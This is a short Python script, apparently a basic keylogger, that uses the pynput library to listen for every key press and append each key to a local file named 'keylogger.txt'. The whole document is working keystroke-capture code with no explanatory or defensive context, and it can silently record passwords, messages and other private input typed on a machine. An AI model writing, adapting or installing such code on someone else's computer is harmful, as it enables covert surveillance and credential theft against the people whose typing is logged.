from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key)


    letter = letter.replace("'","")

    if letter =='Key.space':
        letter = ' '

    with open("keylogger.txt",'a') as f:
        f.write(letter)

with Listener(on_press=write_to_file) as l:
   l.join() 



